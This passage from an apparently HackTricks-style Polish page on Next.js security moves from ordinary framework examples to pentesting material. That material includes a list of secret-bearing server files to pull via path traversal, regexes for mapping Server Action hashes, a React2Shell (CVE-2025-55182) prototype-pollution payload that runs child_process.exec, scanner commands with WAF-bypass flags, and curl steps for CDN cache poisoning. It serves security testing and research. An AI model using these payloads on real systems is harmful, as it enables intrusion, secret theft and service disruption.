function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Cel:** Nadpisuje domyślny Document, umożliwiając dostosowanie tagów `<html>` i `<body>`.

**Zastosowania:**

- Modyfikowanie tagów `<html>` lub `<body>`.
- Dodawanie meta tagów lub niestandardowych skryptów.
- Integracja czcionek firm trzecich.

**Przykład:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Własny serwer (opcjonalnie)

**Cel:** Choć Next.js zawiera wbudowany serwer, możesz utworzyć własny serwer dla zaawansowanych przypadków użycia, takich jak niestandardowe routowanie lub integracja z istniejącymi usługami backendowymi.

**Uwaga:** Używanie własnego serwera może ograniczyć opcje wdrożenia, zwłaszcza na platformach takich jak Vercel, które optymalizują działanie pod wbudowany serwer Next.js.

**Przykład:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Dodatkowe aspekty architektury i bezpieczeństwa

### Zmienne środowiskowe i konfiguracja

**Cel:** Zarządzanie wrażliwymi informacjami i ustawieniami konfiguracyjnymi poza bazą kodu.

**Najlepsze praktyki:**

- **Używaj plików `.env`:** Przechowuj zmienne, takie jak klucze API, w `.env.local` (wyłączone z kontroli wersji).
- **Uzyskuj dostęp do zmiennych w bezpieczny sposób:** Użyj `process.env.VARIABLE_NAME`, aby uzyskać dostęp do zmiennych środowiskowych.
- **Nigdy nie ujawniaj sekretów po stronie klienta:** Upewnij się, że wrażliwe zmienne są używane tylko po stronie serwera.

**Przykład:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Uwaga:** Aby ograniczyć zmienne tylko do strony serwera, pomiń je z obiektu `env` lub poprzedź je `NEXT_PUBLIC_`, żeby były widoczne dla klienta.

### Przydatne artefakty serwera do atakowania przez LFI/download endpoints

Jeśli znajdziesz path traversal lub download API w aplikacji Next.js, celuj w skompilowane artefakty, które leak server-side secrets i auth logic:

- `.env` / `.env.local` dla session secrets i provider credentials.
- `.next/routes-manifest.json` oraz `.next/build-manifest.json` dla kompletnej listy tras.
- `.next/server/pages/api/auth/[...nextauth].js` aby odzyskać skompilowaną konfigurację NextAuth (często zawiera fallback passwords gdy wartości z `process.env` są niezdefiniowane).
- `next.config.js` / `next.config.mjs` aby przejrzeć rewrites, redirects i middleware routing.

### Authentication and Authorization

**Podejście:**

- **Session-Based Authentication:** Użyj cookies do zarządzania sesjami użytkownika.
- **Token-Based Authentication:** Implementuj JWTs dla bezstanowego uwierzytelniania.
- **Third-Party Providers:** Integruj z OAuth providers (np. Google, GitHub) używając bibliotek takich jak `next-auth`.

**Dobre praktyki bezpieczeństwa:**

- **Secure Cookies:** Ustaw atrybuty `HttpOnly`, `Secure` i `SameSite`.
- **Password Hashing:** Zawsze hashuj hasła przed ich zapisaniem.
- **Input Validation:** Zapobiegaj atakom injection poprzez walidację i sanitizację danych wejściowych.

**Przykład:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Optymalizacja wydajności

**Strategie:**

- **Optymalizacja obrazów:** Użyj komponentu Next.js `next/image` do automatycznej optymalizacji obrazów.
- **Dzielenie kodu:** Wykorzystaj dynamiczne importy, aby podzielić kod i zmniejszyć czas ładowania początkowego.
- **Buforowanie:** Zaimplementuj strategie buforowania dla odpowiedzi API i zasobów statycznych.
- **Leniwe ładowanie:** Ładuj komponenty lub zasoby tylko wtedy, gdy są potrzebne.

**Przykład:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions — enumeracja (hash do nazwy funkcji przez source maps)

Nowoczesny Next.js używa „Server Actions”, które wykonują się po stronie serwera, ale są wywoływane z klienta. W środowisku produkcyjnym te wywołania są nieprzejrzyste: wszystkie POSTs trafiają na wspólny endpoint i są rozróżniane przez hash specyficzny dla builda wysyłany w nagłówku `Next-Action`. Przykład:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Kiedy `productionBrowserSourceMaps` jest włączony, zminifikowane chunky JS zawierają wywołania `createServerReference(...)`, które leakują wystarczającą strukturę (oraz powiązane source maps), aby odtworzyć mapowanie pomiędzy hashem akcji a oryginalną nazwą funkcji. Pozwala to przetłumaczyć hashe zaobserwowane w `Next-Action` na konkretne cele, takie jak `deleteUserAccount()` lub `exportFinancialData()`.

### Podejście do ekstrakcji (regex na zminifikowanych JS + opcjonalne source maps)

Przeszukaj pobrane chunky JS pod kątem `createServerReference` i wyciągnij hash oraz symbol funkcji/źródła. Dwa przydatne wzorce:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Grupa 1: hash akcji serwera (40+ znaków szesnastkowych)
- Grupa 2: symbol lub ścieżka, które można rozwiązać do oryginalnej nazwy funkcji za pomocą source map, jeśli są dostępne

Jeśli skrypt zgłasza source map (komentarz na końcu `//# sourceMappingURL=<...>.map`), pobierz ją i rozwiąż symbol/ścieżkę do oryginalnej nazwy funkcji.

### Praktyczny workflow

- Pasywne wykrywanie podczas przeglądania: przechwytuj żądania z nagłówkami `Next-Action` i JS chunk URLs.
- Pobierz wskazane JS bundles i towarzyszące pliki `*.map` (jeżeli występują).
- Uruchom powyższy regex, aby zbudować słownik hash↔nazwa.
- Użyj słownika do celowanego testowania:
  - Triage sterowany nazwami (np. `transferFunds`, `exportFinancialData`).
  - Śledź pokrycie między buildami według nazwy funkcji (hashe zmieniają się między buildami).

### Exercising hidden actions (template-based request)

Użyj poprawnego POST-a zaobserwowanego w proxy jako szablonu i zamień wartość `Next-Action`, aby skierować żądanie do innej odkrytej akcji:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Odtwórz w Repeaterze i przetestuj autoryzację, walidację wejścia oraz logikę biznesową akcji, które normalnie są niedostępne.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automates the above in Burp:
- Mines proxy history for JS chunks, extracts `createServerReference(...)` entries, and parses source maps when available.
- Maintains a searchable hash↔function-name dictionary and de-duplicates across builds by function name.
- Can locate a valid template POST and open a ready-to-send Repeater tab with the target action’s hash swapped in.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Requires `productionBrowserSourceMaps` enabled in production to recover names from bundles/source maps.
- Function-name disclosure is not a vulnerability by itself; use it to guide discovery and test each action’s authorization.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contain a critical server-side prototype pollution during **Flight** chunk deserialization. By crafting `$` references inside a Flight payload an attacker can pivot from polluted prototypes to arbitrary JavaScript execution and then to OS command execution inside the Node.js process.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Łańcuch ataku w chunkach Flight

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Mapowanie ekspozycji React Server Function

React Server Functions (RSF) to funkcje, które zawierają dyrektywę `'use server';`. Każde form action, mutation lub fetch helper powiązane z jedną z tych funkcji staje się RSC Flight endpoint, który chętnie deserializuje attacker-supplied payloads. Przydatne kroki recon wynikające z ocen React2Shell:

- **Static inventory:** sprawdź dyrektywę, aby zrozumieć, ile RSF jest automatycznie wystawionych przez framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` włącza App Router + katalog `app/` domyślnie, co cicho zamienia każdą trasę w endpoint zdolny do RSC. Zasoby App Router takie jak `/_next/static/chunks/app/` lub odpowiedzi, które strumieniują Flight chunks przez `text/x-component`, są silnymi Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** Własne ostrzeżenie Reacta zauważa, że aplikacje dostarczające runtime RSC mogą być podatne **nawet bez eksplicytnych RSFs**, więc traktuj każdy build używający `react-server-dom-*` 19.0.0–19.2.0 jako podejrzany.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. ponownie używają tego samego serializer i dziedziczą identyczną remote attack surface, aż do momentu osadzenia patched React builds.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **podatne** w 19.0.0, 19.1.0–19.1.1 i 19.2.0; **załatane** w 19.0.1, 19.1.2 i 19.2.1 odpowiednio.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 osadzają podatny stack RSC. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 zawierają fixed deps, więc każdy build poniżej tych wersji jest wysokiej wartości.
- **Next.js canary:** `14.3.0-canary.77+` również dostarcza buggy runtime i obecnie brakuje patched canary drops, co czyni te fingerprints silnymi kandydatami do eksploatacji.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) wysyła spreparowany multipart Flight request do kandydackich ścieżek i obserwuje zachowanie po stronie serwera:

- **Default mode** wykonuje deterministyczny payload RCE (operacja matematyczna odzwierciedlona poprzez `X-Action-Redirect`) potwierdzając wykonanie kodu.
- **`--safe-check` mode** celowo deformuje wiadomość Flight tak, że patched serwery zwracają `200/400`, podczas gdy podatne cele emitują odpowiedzi `HTTP/500` zawierające podciąg `E{"digest"` w treści. Ta para `(500 + digest)` jest obecnie najbardziej niezawodnym remote oracle opublikowanym przez defensorów.
- Wbudowane przełączniki `--waf-bypass`, `--vercel-waf-bypass`, oraz `--windows` dostosowują układ payloadu, dopisują junk lub zamieniają polecenia OS, dzięki czemu możesz sondować rzeczywiste Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Inne niedawne problemy App Router (koniec 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – malformed Flight payloads mogą wpędzić resolver RSC w pętlę nieskończoną (pre-auth DoS) lub wymusić serializację skompilowanego kodu Server Function dla innych działań. App Router builds ≥13.3 są podatne aż do załatania; wersje 15.0.x–16.0.x wymagają konkretnych linii patcha z upstream advisory. Wykorzystaj normalną ścieżkę Server Action, ale streamuj ciało `text/x-component` z nadużywającymi referencjami `$`. Za CDN zawieszone połączenie jest utrzymywane otwarte przez timeouty cache, co sprawia, że DoS jest tani.
- **Triage tip:** Niezałatane cele zwracają `500` z `E{"digest"` po malformed Flight payloads; patched builds zwracają `400/200`. Przetestuj każdy endpoint, który już streamuje Flight chunks (szukaj nagłówków `Next-Action` lub odpowiedzi `text/x-component`) i powtórz żądanie z zmodyfikowanym payloadem.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – brak nagłówka `Vary` pozwala, by odpowiedź do `Accept: text/x-component` została zcache'owana i podana do przeglądarek oczekujących HTML. Pojedyncze żądanie inicjujące może zastąpić stronę surowymi payloadami RSC. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
If the second response returns JSON Flight data instead of HTML, the route is poisonable. Purge cache after testing.

## Referencje

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
